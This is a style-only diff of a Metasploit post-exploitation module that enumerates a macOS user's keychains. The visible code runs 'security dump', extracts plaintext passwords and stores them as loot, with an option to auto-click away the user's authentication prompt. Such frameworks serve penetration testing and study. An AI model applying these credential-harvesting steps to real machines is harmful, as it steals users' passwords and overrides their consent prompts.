@@ -7,20 +7,23 @@ class MetasploitModule < Msf::Post
   include Msf::Post::OSX::System
   include Msf::Exploit::FileDropper
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OS X Gather Keychain Enumeration',
-      'Description'   => %q{
-        This module presents a way to quickly go through the current user's keychains and
-        collect data such as email accounts, servers, and other services.  Please note:
-        when using the GETPASS and GETPASS_AUTO_ACCEPT option, the user may see an authentication
-        alert flash briefly on their screen that gets dismissed by a programmatically triggered click.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'ipwnstuff <e[at]ipwnstuff.com>', 'joev' ],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ 'meterpreter', 'shell' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Keychain Enumeration',
+        'Description' => %q{
+          This module presents a way to quickly go through the current user's keychains and
+          collect data such as email accounts, servers, and other services.  Please note:
+          when using the GETPASS and GETPASS_AUTO_ACCEPT option, the user may see an authentication
+          alert flash briefly on their screen that gets dismissed by a programmatically triggered click.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'ipwnstuff <e[at]ipwnstuff.com>', 'joev' ],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
 
     register_options(
       [
@@ -28,7 +31,8 @@ class MetasploitModule < Msf::Post
         OptBool.new('GETPASS_AUTO_ACCEPT', [false, 'Attempt to auto-accept any prompts when collecting passwords.', true]),
         OptInt.new('GETPASS_TIMEOUT', [false, 'Maximum time to wait on all passwords to be dumped.', 999999]),
         OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
-      ])
+      ]
+    )
   end
 
   def list_keychains
@@ -40,7 +44,7 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_accounts(keychains)
-    user =  cmd_exec("whoami").chomp
+    user = cmd_exec("whoami").chomp
     out = cmd_exec("security dump | egrep 'acct|desc|srvr|svce'")
 
     accounts = []
@@ -79,7 +83,7 @@ class MetasploitModule < Msf::Post
       cmd.split("\n").each do |line|
         if line =~ /password: /
           unless line.split()[1].nil?
-            accounts[num]["pass"] = line.split()[1].gsub("\"","")
+            accounts[num]["pass"] = line.split()[1].gsub("\"", "")
           else
             accounts[num]["pass"] = nil
           end
@@ -89,14 +93,13 @@ class MetasploitModule < Msf::Post
     return accounts
   end
 
-
-  def save(data, kind='Keychain information')
+  def save(data, kind = 'Keychain information')
     l = store_loot('macosx.keychain.info',
-      'plain/text',
-      session,
-      data,
-      'keychain_info.txt',
-      'Mac Keychain Account/Server/Service/Description')
+                   'plain/text',
+                   session,
+                   data,
+                   'keychain_info.txt',
+                   'Mac Keychain Account/Server/Service/Description')
 
     print_good("#{@peer} - #{kind} saved in #{l}")
   end
@@ -152,6 +155,5 @@ class MetasploitModule < Msf::Post
       Msf::Config.data_directory, 'exploits', 'osx', 'dump_keychain', 'dump'
     ))
   end
-
 
 end
